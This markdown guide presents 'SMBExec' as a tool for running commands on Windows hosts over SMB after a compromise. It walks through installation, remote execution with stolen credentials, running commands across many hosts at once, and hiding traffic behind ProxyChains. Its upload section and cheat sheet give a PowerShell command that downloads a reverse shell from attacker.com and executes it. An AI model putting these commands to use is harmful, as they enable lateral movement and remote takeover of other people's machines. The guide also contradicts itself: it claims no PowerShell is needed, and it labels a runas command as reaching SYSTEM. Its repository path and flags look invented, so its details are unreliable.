# SMBExec

**Type:** SMB/SMBExec Post-Exploitation Tool
**Focus:** **SMBExec** is a post-exploitation tool that allows attackers to execute commands remotely on Windows machines via SMB (Server Message Block). It can be used for lateral movement and privilege escalation by exploiting misconfigurations in SMB and executing code remotely without requiring remote desktop access.

---

## 1. Full Feature Overview

* **Remote Command Execution**: SMBExec allows remote execution of commands on Windows machines using SMB.
* **No PowerShell Required**: Unlike other post-exploitation tools, **SMBExec** does not require PowerShell to execute commands.
* **Windows Credentials**: The tool uses **Windows SMB credentials** to execute commands or upload payloads on remote machines.
* **SMB Authentication**: It supports both **NTLM** and **Kerberos** authentication for connecting to remote systems.
* **Supports Shellcodes**: Uploads **shellcodes** or **reverse shells** to establish communication with the target.
* **Privilege Escalation**: Can be used for escalating privileges on compromised machines.

---

## 2. Requirements & Setup

### Requirements

* **SMB Port**: The target system must have SMB enabled and be accessible through TCP port **445**.
* **Credentials**: SMBExec requires valid credentials (username and password) for authentication on the target system. In some cases, you may attempt to exploit **null sessions** or weak configurations.
* **No PowerShell**: Unlike other tools that may require PowerShell or other Windows services, **SMBExec** communicates over SMB.

### Installation

1. **Clone SMBExec**:

   You can clone the **SMBExec** repository from GitHub:

   ```bash
   git clone https://github.com/EmpireProject/SMBExec.git
   cd SMBExec
   ```

2. **Install SMBExec**:

   No installation is necessary since it is a simple Python script. Ensure you have **Python 3.x** installed on your machine.

3. **Requirements**:

   * Python 3.x

   * The **impacket** library, which can be installed via pip:

     ```bash
     pip install impacket
     ```

   * Ensure **pywin32** is installed for Windows compatibility (if using a Windows machine for execution):

     ```bash
     pip install pywin32
     ```

---

## 3. Core Usage

### 3.1 Basic Syntax

The basic syntax to run **SMBExec** is as follows:

```bash
python3 smbexec.py -target <target_ip> -user <username> -password <password> -command <command_to_execute>
```

**Example:**

```bash
python3 smbexec.py -target 192.168.1.10 -user Administrator -password password -command "netstat -ano"
```

This command will execute **netstat** on the target machine **192.168.1.10** using the **Administrator** credentials and display active network connections.

### 3.2 Upload and Execute Payloads

You can upload and execute a **reverse shell** or **payload** with **SMBExec**. For example, to upload a **reverse shell** script and execute it:

```bash
python3 smbexec.py -target 192.168.1.10 -user Administrator -password password -command "powershell -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
```

This will download and execute the **reverse shell** from a specified URL (replace `attacker.com` with your own server).

### 3.3 Execute Commands with Elevated Privileges

If you have the ability to execute commands, but need to escalate privileges, you can attempt to use **SMBExec** to execute commands as a higher-privileged user, such as `SYSTEM`:

```bash
python3 smbexec.py -target 192.168.1.10 -user Administrator -password password -command "runas /user:Administrator \"cmd.exe\""
```

This will execute **cmd.exe** with **Administrator** privileges.

### 3.4 Execute on Multiple Hosts

You can target multiple hosts by creating a **target file** with IP addresses or hostnames and specifying it with the `-targetfile` option:

```bash
python3 smbexec.py -targetfile targets.txt -user Administrator -password password -command "ipconfig /all"
```

This will execute the `ipconfig /all` command across all targets in the `targets.txt` file.

---

## 4. Tips, Tricks, Best Practices

* **Credentials Reuse**: If you are using SMBExec to execute commands across a large network, try using the same credentials across multiple systems to save time.
* **SMB Signatures and Encryption**: If SMB signing or encryption is enabled on the target system, it may require additional configuration or tools to bypass.
* **Use with ProxyChains**: For anonymity, use **ProxyChains** or VPNs to route your SMBExec traffic through an anonymous proxy network.
* **Post-Exploitation**: SMBExec can be a **powerful post-exploitation tool** for interacting with compromised systems, uploading payloads, or establishing a reverse shell for further exploitation.

---

## 5. Cheat Sheet

```bash
# Basic command execution via SMBExec
python3 smbexec.py -target <target_ip> -user <username> -password <password> -command "<command>"

# Upload and execute reverse shell script
python3 smbexec.py -target <target_ip> -user <username> -password <password> -command "powershell -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('<your_reverse_shell_url>')"

# Execute elevated command (e.g., SYSTEM privileges)
python3 smbexec.py -target <target_ip> -user <username> -password <password> -command "runas /user:<admin_user> \"cmd.exe\""

# Execute command across multiple machines from target file
python3 smbexec.py -targetfile targets.txt -user <username> -password <password> -command "<command>"
```

---
